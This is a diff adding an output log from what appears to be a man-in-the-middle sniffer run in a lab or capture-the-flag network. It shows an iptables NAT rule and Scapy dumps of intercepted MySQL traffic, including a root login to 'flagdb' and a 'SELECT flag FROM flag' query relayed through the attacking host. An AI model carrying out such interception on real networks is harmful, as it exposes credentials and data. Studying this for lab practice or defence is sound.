@@ -1,0 +1,785 @@
+
+        █▐▒▒░░■· ▀█▀   ▀█▀ ▀███   ▀██▀ mitm
+        █      ■· ▀▀▌  █▀   ████   ██
+        █       ■·  ▀▀██    ██ ██  ██ 
+        █       ■·   █▀     ██  ██ ██
+        █      ■·  ░█▀      ██   ████
+        █▐▒▒░░■·  ▄█▀      ▄██▄   ███
+    
+trying:
+iptables -t nat -A POSTROUTING -o eth0 -s 172.18.0.2 -p tcp --dport 3306 -j SNAT --to 127.0.0.1:3306
+sniffer started!
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 60
+     id        = 62576
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee20
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005560912
+        ack       = 0
+        dataofs   = 10
+        reserved  = 0
+        flags     = S
+        window    = 64240
+        chksum    = 0x5859
+        urgptr    = 0
+        options   = [('MSS', 1460), ('SAckOK', b''), ('Timestamp', (3063741476, 0)), ('NOP', None), ('WScale', 7)]
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 60
+     id        = 62576
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef20
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005560912
+        ack       = 0
+        dataofs   = 10
+        reserved  = 0
+        flags     = S
+        window    = 64240
+        chksum    = 0x5859
+        urgptr    = 0
+        options   = [('MSS', 1460), ('SAckOK', b''), ('Timestamp', (3063741476, 0)), ('NOP', None), ('WScale', 7)]
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 52
+     id        = 62577
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee27
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005560913
+        ack       = 3510788777
+        dataofs   = 8
+        reserved  = 0
+        flags     = A
+        window    = 502
+        chksum    = 0x5851
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741477, 380185549))]
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 52
+     id        = 62577
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef27
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005560913
+        ack       = 3510788777
+        dataofs   = 8
+        reserved  = 0
+        flags     = A
+        window    = 502
+        chksum    = 0x5851
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741477, 380185549))]
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 52
+     id        = 62578
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee26
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005560913
+        ack       = 3510788855
+        dataofs   = 8
+        reserved  = 0
+        flags     = A
+        window    = 502
+        chksum    = 0x5851
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741483, 380185549))]
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 52
+     id        = 62578
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef26
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005560913
+        ack       = 3510788855
+        dataofs   = 8
+        reserved  = 0
+        flags     = A
+        window    = 502
+        chksum    = 0x5851
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741483, 380185549))]
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 343
+     id        = 62579
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xed02
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005560913
+        ack       = 3510788855
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5974
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741484, 380185549))]
+###[ Raw ]### 
+           load      = '\x1f\x01\x00\x01\\x8d\\xa2\\xbf\x19\x00\x00\x00@\\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00root\x00\x14\x06\\xaa\x7f \\xfep,n;\\xa0\x0f\\xf3VN\\x8d\\x94\\xfa\\x9f\\xac\\xd4flagdb\x00mysql_native_password\x00\\xc7\x04_pid\x03149\t_platform\x06x86_64\x0f_client_version\x068.0.33\x03_os\x05Linux\x0c_client_name\x08libmysql\x0c_source_host\x0c030949e286c5\x12_connector_version\x068.0.33\x12_connector_license\x07GPL-2.0\x0f_connector_name\x16mysql-connector-python'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 343
+     id        = 62579
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xee02
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005560913
+        ack       = 3510788855
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5974
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741484, 380185549))]
+###[ Raw ]### 
+           load      = '\x1f\x01\x00\x01\\x8d\\xa2\\xbf\x19\x00\x00\x00@\\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00root\x00\x14\x06\\xaa\x7f \\xfep,n;\\xa0\x0f\\xf3VN\\x8d\\x94\\xfa\\x9f\\xac\\xd4flagdb\x00mysql_native_password\x00\\xc7\x04_pid\x03149\t_platform\x06x86_64\x0f_client_version\x068.0.33\x03_os\x05Linux\x0c_client_name\x08libmysql\x0c_source_host\x0c030949e286c5\x12_connector_version\x068.0.33\x12_connector_license\x07GPL-2.0\x0f_connector_name\x16mysql-connector-python'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 105
+     id        = 62580
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xedef
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561204
+        ack       = 3510788877
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5886
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741488, 380185556))]
+###[ Raw ]### 
+           load      = "1\x00\x00\x00\x03SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'"
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 105
+     id        = 62580
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xeeef
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561204
+        ack       = 3510788877
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5886
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741488, 380185556))]
+###[ Raw ]### 
+           load      = "1\x00\x00\x00\x03SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'"
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 74
+     id        = 62581
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee0d
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561257
+        ack       = 3510788988
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5867
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741488, 380185560))]
+###[ Raw ]### 
+           load      = '\x12\x00\x00\x00\x03SET NAMES utf8mb4'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 74
+     id        = 62581
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef0d
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561257
+        ack       = 3510788988
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5867
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741488, 380185560))]
+###[ Raw ]### 
+           load      = '\x12\x00\x00\x00\x03SET NAMES utf8mb4'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 73
+     id        = 62582
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee0d
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561279
+        ack       = 3510789099
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5866
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741488, 380185560))]
+###[ Raw ]### 
+           load      = '\x11\x00\x00\x00\x03set autocommit=0'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 73
+     id        = 62582
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef0d
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561279
+        ack       = 3510789099
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5866
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741488, 380185560))]
+###[ Raw ]### 
+           load      = '\x11\x00\x00\x00\x03set autocommit=0'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 57
+     id        = 62583
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee1c
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561300
+        ack       = 3510789129
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5856
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+###[ Raw ]### 
+           load      = '\x01\x00\x00\x00\x0e'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 57
+     id        = 62583
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef1c
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561300
+        ack       = 3510789129
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5856
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+###[ Raw ]### 
+           load      = '\x01\x00\x00\x00\x0e'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 78
+     id        = 62584
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee06
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561305
+        ack       = 3510789140
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x586b
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+###[ Raw ]### 
+           load      = '\x16\x00\x00\x00\x03SELECT flag FROM flag'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 78
+     id        = 62584
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef06
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561305
+        ack       = 3510789140
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x586b
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+###[ Raw ]### 
+           load      = '\x16\x00\x00\x00\x03SELECT flag FROM flag'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 57
+     id        = 62585
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee1a
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561331
+        ack       = 3510789262
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5856
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+###[ Raw ]### 
+           load      = '\x01\x00\x00\x00\x01'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 57
+     id        = 62585
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef1a
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561331
+        ack       = 3510789262
+        dataofs   = 8
+        reserved  = 0
+        flags     = PA
+        window    = 502
+        chksum    = 0x5856
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+###[ Raw ]### 
+           load      = '\x01\x00\x00\x00\x01'
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 52
+     id        = 62586
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee1e
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561336
+        ack       = 3510789262
+        dataofs   = 8
+        reserved  = 0
+        flags     = FA
+        window    = 502
+        chksum    = 0x5851
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 52
+     id        = 62586
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef1e
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561336
+        ack       = 3510789262
+        dataofs   = 8
+        reserved  = 0
+        flags     = FA
+        window    = 502
+        chksum    = 0x5851
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:03
+  src       = 02:42:ac:12:00:02
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 52
+     id        = 62587
+     flags     = DF
+     frag      = 0
+     ttl       = 64
+     proto     = tcp
+     chksum    = 0xee1d
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561337
+        ack       = 3510789263
+        dataofs   = 8
+        reserved  = 0
+        flags     = A
+        window    = 502
+        chksum    = 0x5851
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+
+###[ Ethernet ]### 
+  dst       = 02:42:ac:12:00:04
+  src       = 02:42:ac:12:00:03
+  type      = IPv4
+###[ IP ]### 
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 52
+     id        = 62587
+     flags     = DF
+     frag      = 0
+     ttl       = 63
+     proto     = tcp
+     chksum    = 0xef1d
+     src       = 172.18.0.2
+     dst       = 172.18.0.4
+     \options   \
+###[ TCP ]### 
+        sport     = 33954
+        dport     = mysql
+        seq       = 4005561337
+        ack       = 3510789263
+        dataofs   = 8
+        reserved  = 0
+        flags     = A
+        window    = 502
+        chksum    = 0x5851
+        urgptr    = 0
+        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3063741489, 380185561))]
+
+Killing threads and exiting...
+Killing threads and exiting...
